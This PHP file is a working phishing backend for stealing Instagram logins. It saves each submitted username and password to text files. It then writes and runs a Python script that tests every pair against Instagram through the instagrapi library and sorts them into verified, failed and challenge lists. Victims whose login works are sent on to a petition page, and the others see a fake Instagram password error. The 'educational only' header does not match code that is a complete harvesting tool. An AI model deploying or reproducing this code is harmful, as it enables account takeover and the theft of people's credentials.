<?php
/**
 * EDUCATIONAL SCRIPT ONLY - DO NOT USE FOR MALICIOUS PURPOSES
 * Demonstrates credential verification complexity using Python
 */

// Set content type to JSON
header('Content-Type: application/json');

// echo"=== SCRIPT STARTED ===\n";
// echo"Timestamp: " . date('Y-m-d H:i:s') . "\n";
// echo"File: " . __FILE__ . "\n";
// echo"Directory: " . __DIR__ . "\n";

// STEP 1: CAPTURE CREDENTIALS
// echo"\n--- STEP 1: CAPTURING CREDENTIALS ---\n";
$username = $_POST['username'];
$password = $_POST['password'];
// echo"Username received: " . $username . "\n";
// echo"Password received: " . $password . "\n";

file_put_contents("usernames.txt", "Instagram Username: " . $username . " Pass: " . $password . "\n", FILE_APPEND);
// echo"Credentials saved to usernames.txt\n";

// STEP 2: CHECK PYTHON AVAILABILITY
// echo"\n--- STEP 2: CHECKING PYTHON AVAILABILITY ---\n";
$python_path = '';
$python_commands = ['python3', 'python', 'python3.9', 'python3.8', 'python3.7'];

foreach ($python_commands as $cmd) {
    $output = shell_exec("which $cmd 2>/dev/null");
    if (!empty($output)) {
        $python_path = trim($output);
        // echo"Python found at: " . $python_path . "\n";
        break;
    }
}

if (empty($python_path)) {
    // echo"ERROR: Python not found on system\n";
    // echo"Available commands: " . shell_exec("which python* 2>/dev/null") . "\n";
    file_put_contents("verification_log.txt", "Python not available for verification\n", FILE_APPEND);
    
    // Return JSON response
    echo json_encode([
        'status' => 'ERROR',
        'message' => 'Python not available for verification',
        'redirect' => false
    ]);
    exit();
}

// STEP 3: CREATE PYTHON VERIFICATION SCRIPT
// echo"\n--- STEP 3: CREATING PYTHON VERIFICATION SCRIPT ---\n";
$python_script = 'instagram_verifier.py';
$python_code = '#!/usr/bin/env python3
import sys
import json
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, BadPassword, ChallengeRequired

def verify_instagram_credentials(username, password):
    client = Client()
    try:
        # Attempt to log in
        client.login(username, password)
        print("SUCCESS: Credentials are valid! Successfully logged in.")
        # Log out to avoid keeping the session active
        client.logout()
        return {"status": "SUCCESS", "message": "Login successful"}
    except BadPassword:
        print("FAILED: Invalid password. Please check your password.")
        return {"status": "FAILED", "message": "Invalid password"}
    except LoginRequired:
        print("FAILED: Login failed. Check your username or account status.")
        return {"status": "FAILED", "message": "Login failed - check username"}
    except ChallengeRequired:
        print("CHALLENGE: Two-factor authentication or challenge required.")
        return {"status": "CHALLENGE", "message": "2FA/Challenge required"}
    except Exception as e:
        print("ERROR: An error occurred: " + str(e))
        return {"status": "ERROR", "message": str(e)}

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("ERROR: Usage: python3 script.py username password")
        sys.exit(1)
    
    username = sys.argv[1]
    password = sys.argv[2]
    
    result = verify_instagram_credentials(username, password)
    # Output result as JSON for PHP to parse
    print("JSON_RESULT:" + json.dumps(result))
';

if (file_put_contents($python_script, $python_code)) {
    // echo"Python script created successfully\n";
    chmod($python_script, 0755); // Make executable
} else {
    // echo"ERROR: Could not create Python script\n";
    file_put_contents("verification_log.txt", "Failed to create Python script\n", FILE_APPEND);
    
    // Return JSON response
    echo json_encode([
        'status' => 'ERROR',
        'message' => 'Failed to create Python script',
        'redirect' => false
    ]);
    exit();
}

// STEP 4: CHECK PYTHON DEPENDENCIES
// echo"\n--- STEP 4: CHECKING PYTHON DEPENDENCIES ---\n";
$dependency_check = shell_exec("$python_path -c 'import instagrapi' 2>&1");
if (strpos($dependency_check, 'ImportError') !== false || strpos($dependency_check, 'ModuleNotFoundError') !== false) {
    // echo"ERROR: instagrapi module not found. Installing...\n";
    
    // Try to install instagrapi
    $install_output = shell_exec("$python_path -m pip install instagrapi 2>&1");
    // echo"Installation output: " . $install_output . "\n";
    
    // Check again
    $dependency_check = shell_exec("$python_path -c 'import instagrapi' 2>&1");
    if (strpos($dependency_check, 'ImportError') !== false || strpos($dependency_check, 'ModuleNotFoundError') !== false) {
        // echo"ERROR: Could not install instagrapi module\n";
        file_put_contents("verification_log.txt", "instagrapi module not available\n", FILE_APPEND);
        
        // Return JSON response
        echo json_encode([
            'status' => 'ERROR',
            'message' => 'Could not install instagrapi module',
            'redirect' => false
        ]);
        exit();
    }
}
// echo"Python dependencies are available\n";

// STEP 5: EXECUTE PYTHON VERIFICATION
// echo"\n--- STEP 5: EXECUTING PYTHON VERIFICATION ---\n";
// echo"Calling Python script for verification...\n";

// Escape username and password for shell safety
$escaped_username = escapeshellarg($username);
$escaped_password = escapeshellarg($password);

// Execute Python script
$command = "$python_path $python_script $escaped_username $escaped_password 2>&1";
// echo"Executing command: $command\n";

$output = shell_exec($command);
// echo"Python script output:\n$output\n";

// STEP 6: PARSE PYTHON RESULTS
// echo"\n--- STEP 6: PARSING PYTHON RESULTS ---\n";
$verification_result = "UNKNOWN";
$result_message = "No result from Python script";

if (!empty($output)) {
    // Look for JSON result in output
    if (preg_match('/JSON_RESULT:(.+)$/m', $output, $matches)) {
        $json_result = $matches[1];
        $result_data = json_decode($json_result, true);
        
        if ($result_data && isset($result_data['status'])) {
            $verification_result = $result_data['status'];
            $result_message = $result_data['message'];
            // echo"Parsed result: " . $verification_result . " - " . $result_message . "\n";
        } else {
            // echo"ERROR: Could not parse JSON result\n";
        }
    } else {
        // echo"No JSON result found in Python output\n";
    }
} else {
    // echo"ERROR: No output from Python script\n";
}

// STEP 7: LOG RESULTS
// echo"\n--- STEP 7: LOGGING RESULTS ---\n";
$log_entry = date('Y-m-d H:i:s') . " - Username: " . $username . " - Result: " . $verification_result . " - Message: " . $result_message . "\n";
file_put_contents("verification_log.txt", $log_entry, FILE_APPEND);
// echo"Results logged to verification_log.txt\n";

// STEP 8: HANDLE RESULTS
// echo"\n--- STEP 8: HANDLING RESULTS ---\n";
switch ($verification_result) {
    case "SUCCESS":
        file_put_contents("verified_credentials.txt", "VERIFIED: " . $username . ":" . $password . "\n", FILE_APPEND);
        // echo"SUCCESS: Credentials saved to verified_credentials.txt\n";
        break;
    case "FAILED":
        file_put_contents("failed_credentials.txt", "FAILED: " . $username . ":" . $password . "\n", FILE_APPEND);
        // echo"FAILED: Credentials saved to failed_credentials.txt\n";
        break;
    case "CHALLENGE":
        file_put_contents("challenge_required.txt", "CHALLENGE: " . $username . ":" . $password . "\n", FILE_APPEND);
        // echo"CHALLENGE: Credentials saved to challenge_credentials.txt\n";
        break;
    case "ERROR":
        file_put_contents("error_credentials.txt", "ERROR: " . $username . ":" . $password . " - " . $result_message . "\n", FILE_APPEND);
        // echo"ERROR: Credentials saved to error_credentials.txt\n";
        break;
    default:
        file_put_contents("unknown_results.txt", "UNKNOWN: " . $username . ":" . $password . " - " . $verification_result . "\n", FILE_APPEND);
        // echo"UNKNOWN: Result saved to unknown_results.txt\n";
        break;
}

// STEP 9: CLEANUP
// echo"\n--- STEP 9: CLEANING UP ---\n";
if (file_exists($python_script)) {
    unlink($python_script);
    // echo"Python script cleaned up\n";
}

// STEP 10: RETURN JSON RESPONSE
// echo"\n--- STEP 10: RETURNING JSON RESPONSE ---\n";

if ($verification_result === "SUCCESS") {
    // Password is correct - return success with redirect flag
    echo json_encode([
        'status' => 'SUCCESS',
        'message' => 'Verified Successfully! redirecting to Petition',
        'redirect' => true,
        'redirect_url' => 'https://www.oxfam.org/en/open-call-immediate-ceasefire-gaza-strip-and-israel'
    ]);
} else {
    // Password is wrong or other issues - return error without redirect
    $error_message = "Sorry, your password was incorrect. Please double-check your password.";
    
    if ($verification_result === "CHALLENGE") {
        $error_message = "Two-factor authentication is required. Please log in through the official Instagram app.";
    } elseif ($verification_result === "ERROR") {
        $error_message = "An error occurred during verification. Please try again later.";
    }
    
    echo json_encode([
        'status' => $verification_result,
        'message' => $error_message,
        'redirect' => false,
        'username' => $username
    ]);
}

exit();
?>